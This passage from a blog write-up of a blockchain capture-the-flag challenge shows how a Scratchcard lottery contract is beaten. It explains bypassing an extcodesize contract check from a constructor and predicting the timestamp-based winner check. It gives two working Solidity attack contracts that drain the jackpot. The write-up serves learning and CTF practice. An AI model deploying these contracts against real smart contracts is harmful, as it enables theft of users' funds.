<span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">collectMegaJackpot</span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">_amount</span><span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span>notContract<span class="w"> </span>ctf<span class="p">{</span>
<span class="w">        </span><span class="kt">require</span><span class="p">(</span>checkIfMegaJackpotWinner<span class="p">(),</span><span class="w"> </span><span class="s2">&quot;User Not Winner&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="kt">require</span><span class="p">(</span><span class="m m-Decimal">2</span><span class="w"> </span><span class="o">*</span><span class="w"> </span>cost<span class="w"> </span><span class="o">-</span><span class="w"> </span>_amount<span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Winners May Only Withdraw Up To 2x Their Scratchcard Cost&quot;</span><span class="p">);</span>
<span class="w">        </span>winCount<span class="p">[</span><span class="k">msg.sender</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">;</span>
<span class="w">        </span><span class="k">msg.sender</span><span class="p">.</span>transfer<span class="p">(</span>_amount<span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="kt">payable</span><span class="w"> </span>ctf<span class="p">{</span>
<span class="w">        </span>play<span class="p">();</span>
<span class="w">    </span><span class="p">}</span>

<span class="p">}</span>
</code></pre></div>

<p>This contract is a bit trickier, we see a bit of inline assembly being used to check the code size of calling address.</p>
<div class="highlight"><pre><span></span><code><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">size</span><span class="p">;</span>
<span class="w">    </span>assembly<span class="w"> </span><span class="p">{</span><span class="w"> </span>size<span class="w"> </span><span class="o">:=</span><span class="w"> </span>extcodesize<span class="p">(</span>account<span class="p">)</span><span class="w"> </span><span class="p">}</span>
</code></pre></div>

<p>This can be used to show us if we are being called from the contract, but it can be bypassed. We can do this by calling victim contract from the constructor of our attack contract (since constructor sets contract code during its runtime <code>extcodesize</code> is going to be 0).</p>
<p>Another thing to note is that <code>(now%10**8)*10**10 == msg.value</code> is being used to check if we are the winner. But since, with our contract check bypass, we can call Raffle from the contract if we do the same calculation we will get the required message value. The <code>now</code> is just alias for <code>block.timestamp</code> and will be the same for all transactions/function calls in the same block.</p>
<p>So let's write attack code:</p>
<div class="highlight"><pre><span></span><code><span class="k">pragma solidity</span><span class="w"> </span><span class="err">0.4.24</span><span class="p">;</span>

<span class="kt">import</span><span class="w"> </span><span class="s2">&quot;./Scratchcard .sol&quot;</span><span class="p">;</span>

<span class="k">contract</span><span class="w"> </span><span class="ni">Attack2</span><span class="p">{</span>
<span class="w">    </span><span class="kt">address</span><span class="w"> </span><span class="nv">owner</span><span class="p">;</span>
<span class="w">    </span>Scratchcard<span class="w"> </span>game<span class="w"> </span><span class="o">=</span><span class="w"> </span>Scratchcard<span class="p">(</span><span class="mh">0x8b8450970A7C25D7517100EEfF0Cb23357c50c86</span><span class="p">);</span>

<span class="w">    </span><span class="kt">constructor</span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="kt">payable</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span>owner<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">tx.origin</span><span class="p">;</span>
<span class="w">        </span><span class="kt">uint</span><span class="w"> </span><span class="nv">val</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span>now<span class="o">%</span><span class="m m-Decimal">10</span><span class="o">**</span><span class="m m-Decimal">8</span><span class="p">)</span><span class="o">*</span><span class="m m-Decimal">10</span><span class="o">**</span><span class="m m-Decimal">10</span><span class="p">;</span>
<span class="w">        </span><span class="kt">for</span><span class="w"> </span><span class="p">(</span><span class="kt">uint</span><span class="w"> </span><span class="nv">i</span><span class="o">=</span><span class="m m-Decimal">0</span><span class="p">;</span><span class="w"> </span>i<span class="o">&lt;</span><span class="m m-Decimal">25</span><span class="p">;</span><span class="w"> </span>i<span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span>game<span class="p">.</span>play<span class="p">.</span>value<span class="p">(</span>val<span class="p">)();</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span>game<span class="p">.</span>collectMegaJackpot<span class="p">(</span><span class="m m-Decimal">2</span><span class="o">*</span><span class="w"> </span>val<span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="m m-Decimal">1</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">withdraw</span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span><span class="k">msg.sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span>owner<span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">msg.sender</span><span class="p">.</span>transfer<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">).</span>balance<span class="p">);</span><span class="w"> </span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="kt">payable</span><span class="w"> </span><span class="p">{}</span>
<span class="p">}</span>


<span class="k">pragma solidity</span><span class="w"> </span><span class="err">0.4.24</span><span class="p">;</span>

<span class="kt">import</span><span class="w"> </span><span class="s2">&quot;./Attack.sol&quot;</span><span class="p">;</span>

<span class="k">contract</span><span class="w"> </span><span class="ni">Attack</span><span class="p">{</span>
<span class="w">    </span><span class="kt">address</span><span class="w"> </span><span class="nv">owner</span><span class="p">;</span>

<span class="w">    </span><span class="kt">constructor</span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="kt">payable</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span>owner<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">msg.sender</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">addressFrom</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">_origin</span><span class="p">,</span><span class="w"> </span><span class="kt">uint</span><span class="w"> </span><span class="nv">_nonce</span><span class="p">)</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span>pure<span class="w"> </span><span class="kt">returns</span><span class="w"> </span><span class="p">(</span><span class="kt">address</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kt">return</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="nb">keccak256</span><span class="p">(</span>byte<span class="p">(</span><span class="mh">0xd6</span><span class="p">),</span><span class="w"> </span>byte<span class="p">(</span><span class="mh">0x94</span><span class="p">),</span><span class="w"> </span>_origin<span class="p">,</span><span class="w"> </span>byte<span class="p">(</span>_nonce<span class="p">)));</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">attackScratchcard</span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="kt">payable</span><span class="p">{</span>
<span class="w">        </span>Attack<span class="w"> </span>con<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">new</span><span class="w"> </span>Attack<span class="p">).</span>value<span class="p">(</span><span class="k">msg.value</span><span class="p">)();</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">withdraw</span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span><span class="k">msg.sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span>owner<span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">msg.sender</span><span class="p">.</span>transfer<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">).</span>balance<span class="p">);</span><span class="w"> </span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="kt">payable</span><span class="w"> </span><span class="p">{}</span>
<span class="p">}</span>
</code></pre></div>

<p>We have two attack contracts. When <code>attackScratchcard</code> is called on Attack contract we deploy Attack2 that does actual attack from its constructor.</p>
<p>We also have to calculate addresses of Attack2 contracts before they are created so we can add them as authorized (<code>ctf_challenge_add_authorized_sender</code> from CtfFramework).</p>
                </div>
                <footer class="text-right">
                    <p>- F3real</p>
                </footer>
    <div id="show-comments" class="span7 text-center">
        <a href="https://f3real.github.io/blockchain_ctf1213.html#disqus_thread"
          data-disqus-identifier="blockchain_ctf1213"
        class="btn btn-primary twitchy-background">Show Comments</a>
    </div>
    <section id="comments" class="comments hidden">
        <hr/>
        <h2>Comments</h2>
        <div id="disqus_thread"></div>
        <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by
            Disqus.</a></noscript>
        <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
    </section>
            </div>
        </div>
    </article>
</section>
<footer>
    <hr>
    <div class="row">
        <div class="col-lg-10 text-center">
            <p><small>
                Built by <a href="http://docs.getpelican.com/en/latest">Pelican</a> / <a href="https://github.com/F3real/pelican-twitchy">pelican-twitchy</a>
                &middot;                    &copy; 2024 F3real
            </small></p>
        </div>
    </div>
</footer>            </div>
        </div>
        <!-- /#page-content-wrapper -->
    </div>
    <!-- /#wrapper -->

<!-- disqus -->
<script type="text/javascript">
    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
    var disqus_shortname = 'https-f3real-github-io'; // required: replace example with your forum shortname

            var disqus_identifier = 'blockchain_ctf1213';
        var disqus_url = 'https://f3real.github.io/blockchain_ctf1213.html';

    var disqus_config = function () {
        this.language = "en";
    };

        var commentsDiv = document.getElementById('show-comments');
        commentsDiv.onclick = function() {
            /* * * DON'T EDIT BELOW THIS LINE * * */
    (function () {
        var dsq = document.createElement('script');
        dsq.type = 'text/javascript';
        dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
            this.style.display = 'none';        
        };
</script>
<!-- /disqus -->
    <script>
        const wrapper = document.getElementById('wrapper');
        const sidebarBig = document.getElementById('sidebar-wrapper');
        const sidebarSmall = document.getElementById('sidebar-wrapper-small');

        const triggers = Array.from(document.querySelectorAll('[data-toggle="collapse"]'));
        for (var i = 0; i < triggers.length; i++) { 
            triggers[i].addEventListener('click', (ev) => {
                const elm = ev.currentTarget;    
                ev.preventDefault();
                const selector = elm.getAttribute('href').replace('#','');
                elm.classList.toggle('collapsed');
                document.getElementById(selector).classList.toggle('show');
            }, false);
        } 

        function showBigNav() {;
            sidebarBig.style.display = 'block';
            sidebarSmall.style.display = 'none';
        }
        function showSmallNav() {
            sidebarBig.style.display = 'none';
            sidebarSmall.style.display = 'block';
        }

        const mediaQuery = window.matchMedia('(min-width:768px)');
        mediaQuery.onchange = e => {
            if (wrapper.classList.contains('toggled')) {
                    wrapper.classList.remove('toggled');
            } else {
                if (e.matches) {
                    showBigNav();
                } else {
                    showSmallNav();
                }
            }
        }

        function setNavbar() {
            var condition = wrapper.classList.contains('toggled');
            if (!mediaQuery.matches) {
                condition = !condition;
            }
            if (condition) {
                showSmallNav();
            } else {
                showBigNav();
            }
        }

        function toggleMenu(){
            wrapper.classList.toggle('toggled');
            setNavbar();
        }

        window.onload = setNavbar;
    </script>
	<script data-goatcounter="https://f3real.goatcounter.com/count"
        async src="//gc.zgo.at/count.js"></script>
</body>
</html>